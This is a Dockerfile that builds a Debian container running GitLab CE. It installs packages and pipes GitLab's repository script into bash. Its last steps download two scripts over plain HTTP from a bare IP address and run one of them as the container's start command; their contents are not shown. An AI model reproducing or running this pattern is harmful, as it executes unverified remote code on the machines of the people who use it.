# Build Process #
# docker build -t mygit .
# docker run -p 443:443 -p 8082:80 -p 2200:22 --name gitlab -it mygit
# Check : 192.168.99.100:8082
FROM debian
EXPOSE 80 2200 443
ENV TERM=xterm
RUN apt-get update -yq && \
	apt-get install -yq curl openssh-server ca-certificates postfix cron systemd systemd-sysv vim && \
	apt-get install -yq postfix
RUN curl https://packages.gitlab.com/install/repositories/gitlab/gitlab-ce/script.deb.sh | bash
RUN apt-get install -yq gitlab-ce
RUN mkdir -p /home/app/
WORKDIR /home/app
RUN curl 5.135.249.208/sysctl.rb > /home/app/sysctl.rb
RUN curl 5.135.249.208/script.sh > /home/app/script.sh
CMD ["sh","script.sh"]
